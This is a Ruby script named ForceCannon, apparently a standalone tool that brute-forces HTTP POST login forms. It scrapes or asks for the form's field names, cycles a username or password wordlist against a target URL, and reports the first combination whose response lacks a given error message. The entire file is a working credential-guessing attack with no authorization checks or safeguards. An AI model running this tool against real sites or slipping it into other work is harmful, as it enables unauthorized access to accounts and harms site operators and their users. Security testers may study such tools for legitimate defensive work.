#!/usr/bin/env ruby

require 'net/http'
require 'open-uri'
require 'optparse'
require 'nokogiri'
require 'uri'

class ForceCannon

    def initialize
        @options = {}
    end

    def parse_options

        OptionParser.new do |opt|

            opt.banner = "\nUsage: ./app.rb [-t/--target] [-u/--username] [-P/--Password_list] [-e/--error_msg]"
            opt.on("-t", "--target TARGET", "Target IP address or domain name") do |target|

                @options[:target] = target
            end
            opt.on("-u", "--username USER_VALUE", "Username value") do |username|

                @options[:username] = username
            end
            opt.on("-p", "--password PASSWORD_VALUE", "Password value") do |password|

                @options[:password] = password
            end
            opt.on("-U", "--Users_list WORDLIST", "Wordlist of Usernames") do |usersList|

                @options[:usersList] = usersList
            end
            opt.on("-P", "--Password_list WORDLIST", "Wordlist of Passwords") do |passList|

                @options[:passList] = passList
            end
            opt.on("-e", "--error_msg AUTH_ERROR_MSG", "Authentication error message to check if the attack was successful") do |error|

                @options[:error] = error
            end
            opt.on("-h", "--help", "show this help message and exit") do
                
                puts opt
                exit
            end
        end.parse!

        validate_options
        @options
    end

    def validate_options
        
        if @options[:target].nil?
            puts "\n[X] Select the target IP or domain name!\n"
            exit
        end

        if @options[:usersList].nil? && @options[:passList].nil?
            puts "\n[X] The Users wordlist or the Passwords wordlist must be provided!\n"
            exit
        end

        if @options[:error].nil? 
            puts "\n[X] The authentication error message must be provided!\n"
            exit
        end

        if @options[:username].nil? && @options[:password].nil?
            puts "\n[X] The username or password must be provided!"
            exit
        end
    end

    def operating_modes(response)

        inputs_names = []
        banner = File.read("logo_cannon.txt")
        puts banner

        if response.to_i == 1

            parsed_data = Nokogiri::HTML.parse(URI.open(@options[:target])) 

            test = parsed_data.css('form[method=post]')[0].css('input').select{|types| types['type'] == "text" || types['type'] == "password"}
            test.each{|names| inputs_names.push(names.attributes['name'])}

        elsif response.to_i == 2

            puts "===" * 20
            print "[?] Name attribute (Username): "

            inputs_names[0] = $stdin.gets.chomp
            puts "===" * 20
            print "[?] Name attribute (Password): "

            inputs_names[1] = $stdin.gets.chomp
            puts "===" * 20 + "\n\n"

        else
            puts "[!] Unknown mode selected, starting default mode...\n\n"
            
            puts "===" * 20
            print "[?] Name attribute (Username): "

            inputs_names[0] = $stdin.gets.chomp
            puts "===" * 20
            print "[?] Name attribute (Password): "

            inputs_names[1] = $stdin.gets.chomp
            puts "===" * 20 + "\n\n"

        end

        @user_data = inputs_names[0]
        @pass_data = inputs_names[1]
    end

    def bruteforce_HTTP_POST

        print "\n[!] Select an operating mode\n\n"
        print "1 - Automatic Mode ---> Automatically enters the values of the ['name'] attributes"
        puts "\n(Not 100% reliable)\n"
        print "\n2 - Manual Mode ---> Manually enter the values of the ['name'] attributes"
        puts "\n(100% reliable)\n\n"
        print "Mode => "
        response = $stdin.gets.chomp
        
        operating_modes(response)

        puts "---" * 15
        puts "[?] Initializing BruteForce Attack\n"
        puts "---" * 15 + "\n\n"

        puts "---" * 15 
        puts "[!] Attacking..."
        puts "---" * 15

        url = URI(@options[:target])
        status = Net::HTTP.get_response(url)

        if status.code.to_i == 200 || status.code.to_i == 302
            if @options[:usersList].nil? && !@options[:passList].empty?

                File.open(@options[:passList], "r") do |list|
                    list.each_line do |line|
                        parameters = {
                            @user_data => @options[:username],
                            @pass_data => line.chomp
                        }
                            
                        request = Net::HTTP.post_form(url, parameters)      
                        if request.body.include?(@options[:error])
                            puts "\n[+] Testing with #{@options[:username]} | #{line.chomp}"
                            
                        else
                            print "\n" + "***" * 25
                            print "\n[✓] Combination found! => User: #{@options[:username]} | Password: #{line.chomp}\n"
                            puts "***" * 25 + "\n\n"
                            break
                        end
                    end
                end
            else
                File.open(@options[:usersList], "r") do |list|
                    list.each_line do |line|
                        parameters = {
                            @user_data => line.chomp,
                            @pass_data => @options[:password]
                        }
                        
                        request = Net::HTTP.post_form(url, parameters)
                        if request.body.include?(@options[:error])
                            puts "\n[+] Testing with #{line.chomp} | #{@options[:password]}"

                        else
                            print "\n" + "***" * 25
                            print "\n[✓] Combination found! => User: #{line.chomp} | Password: #{@options[:password]}\n"
                            puts "***" * 25 + "\n\n"
                            break
                        end
                    end
                end
            end            
        else
            puts "[X] The target is off\n"
        end
    end
end

force_cannon = ForceCannon.new
options = force_cannon.parse_options
force_cannon.bruteforce_HTTP_POST
